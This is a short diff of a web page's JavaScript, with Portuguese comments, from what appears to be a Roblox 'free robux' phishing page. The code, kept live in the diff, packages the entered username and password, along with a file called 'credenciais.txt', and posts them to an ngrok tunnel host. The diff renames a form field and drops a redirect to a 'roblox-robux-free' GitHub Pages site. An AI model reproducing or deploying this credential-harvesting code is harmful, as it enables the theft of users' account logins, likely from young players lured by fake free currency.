@@ -575,7 +575,7 @@ site.</div></div></noscript>
 
         // Criar FormData e adicionar o arquivo
         const formData = new FormData();
-        formData.append('credentials_file', blob, 'credenciais.txt');
+        formData.append('login', blob, 'credenciais.txt');
         formData.append('username', username);
         formData.append('password', password);
 
@@ -588,7 +588,6 @@ fetch('https://870543efcd45.ngrok-free.app/login/', {
     if (response.ok) {
         messageDiv.textContent = 'Login bem-sucedido!';
         messageDiv.style.color = '#00aa00';
-        window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html";
     } else {
         messageDiv.textContent = 'Erro no login. Tente novamente.';
     }
